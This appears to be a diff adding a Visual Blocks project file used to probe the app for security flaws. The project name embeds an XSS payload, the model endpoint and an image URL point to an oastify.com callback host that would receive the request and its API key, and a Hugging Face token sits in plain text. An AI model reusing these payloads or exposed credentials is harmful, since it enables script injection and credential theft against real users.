@@ -1,0 +1,236 @@
+{
+  "project": {
+    "id": "5dzpni",
+    "name": "test-token\"><img src=y onerror=confirm(1)>",
+    "creationTs": 1734108796924,
+    "lastModifiedTs": 1734130921810,
+    "userSetData": {
+      "description": "ddddd",
+      "tags": [],
+      "contactURL": "",
+      "tutorialYouTube": ""
+    }
+  },
+  "graph": {
+    "nodes": [
+      {
+        "id": "hf-hub-login_p2gp0g",
+        "source": {
+          "url": "https://cdn.jsdelivr.net/npm/huggingface-visualblocks-nodes@latest"
+        },
+        "nodeSpecId": "hf-hub-login",
+        "customData": {
+          "previewX": 16,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1808,
+          "posY": -368,
+          "width": 217.81884765625,
+          "height": 130,
+          "selected": false
+        },
+        "propValues": {
+          "apikey": "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",
+          "hidePreview": false
+        }
+      },
+      {
+        "id": "logger-node_9yofbd",
+        "nodeSpecId": "logger-node",
+        "customData": {
+          "previewX": 688,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1712,
+          "posY": -192,
+          "width": 176,
+          "height": 69,
+          "selected": false
+        },
+        "inputValues": {
+          "data": []
+        },
+        "incomingEdges": {
+          "data": [
+            {
+              "sourceNodeId": "hf-hub-login_p2gp0g",
+              "outputId": "apikey"
+            }
+          ]
+        }
+      },
+      {
+        "id": "logger-node_4w64pr",
+        "nodeSpecId": "logger-node",
+        "customData": {
+          "previewX": 688,
+          "previewY": 272,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -912,
+          "posY": -160,
+          "width": 176,
+          "height": 69,
+          "selected": false
+        },
+        "inputValues": {
+          "data": []
+        },
+        "incomingEdges": {
+          "data": [
+            {
+              "sourceNodeId": "hf-server-chat-completion_hhamgi",
+              "outputId": "results"
+            }
+          ]
+        }
+      },
+      {
+        "id": "html_viewer_nm9fyu",
+        "nodeSpecId": "html_viewer",
+        "customData": {
+          "previewX": 352,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -976,
+          "posY": -352,
+          "width": 250,
+          "height": 130,
+          "selected": false
+        },
+        "propValues": {
+          "hidePreview": false,
+          "hidePreviewFrame": false
+        },
+        "inputValues": {
+          "html": ""
+        },
+        "incomingEdges": {
+          "html": [
+            {
+              "sourceNodeId": "hf-server-chat-completion_hhamgi",
+              "outputId": "results"
+            }
+          ]
+        }
+      },
+      {
+        "id": "hf-server-chat-completion_hhamgi",
+        "source": {
+          "url": "https://cdn.jsdelivr.net/npm/huggingface-visualblocks-nodes@latest"
+        },
+        "nodeSpecId": "hf-server-chat-completion",
+        "customData": {
+          "previewX": 352,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1424,
+          "posY": -352,
+          "width": 176,
+          "height": 318,
+          "selected": false
+        },
+        "inputValues": {
+          "user": "d",
+          "assistant": "",
+          "system": "",
+          "temperature": 1,
+          "max_tokens": 200,
+          "frequency_penalty": -2,
+          "modelid": "mistralai/Mistral-7B-Instruct-v0.2",
+          "endpointurl": "https://6gnmhosw0zg85xaxk48x4c574yapytmi.oastify.com",
+          "apikey": "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",
+          "stream": false
+        }
+      },
+      {
+        "id": "image_viewer_iz5ttk",
+        "nodeSpecId": "image_viewer",
+        "customData": {
+          "previewX": 1024,
+          "previewY": 16,
+          "previewWidth": 320,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1408,
+          "posY": -80,
+          "width": 176,
+          "height": 185,
+          "selected": false
+        },
+        "propValues": {
+          "columnCount": "2",
+          "hidePreview": false
+        },
+        "inputValues": {
+          "images": [],
+          "urls": "6gnmhosw0zg85xaxk48x4c574yapytmi.oastify.com"
+        },
+        "incomingEdges": {
+          "images": [
+            {
+              "sourceNodeId": "input_image_g8t2lg",
+              "outputId": "image"
+            }
+          ]
+        }
+      },
+      {
+        "id": "input_image_g8t2lg",
+        "nodeSpecId": "input_image",
+        "customData": {
+          "initialWidth": 448,
+          "initialHeight": 240,
+          "previewX": 288,
+          "previewY": 160,
+          "previewWidth": 448,
+          "previewHeight": 240
+        },
+        "uiData": {
+          "posX": -1680,
+          "posY": -112,
+          "width": 176,
+          "height": 180,
+          "selected": false
+        },
+        "propValues": {
+          "urls": [
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic1.jpg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic2.jpeg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic3.jpg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic4.jpeg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic5.jpg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic6.jpg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic7.jpeg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic8.jpg",
+            "https://storage.googleapis.com/tfweb/visualblocks-input-images/pic9.jpg",
+            "image=rr8dx3"
+          ],
+          "gridColumnCount": 3,
+          "allowUserUpload": true,
+          "selectedImageUrl": "image=rr8dx3",
+          "hidePreview": false
+        }
+      }
+    ]
+  },
+  "customNodeUrls": [
+    "https://storage.googleapis.com/tfweb/visualblocks-github-bundles/@visualblocks/gemini@latest/dist/bundle.js",
+    "https://cdn.jsdelivr.net/npm/huggingface-visualblocks-nodes@latest"
+  ]
+}
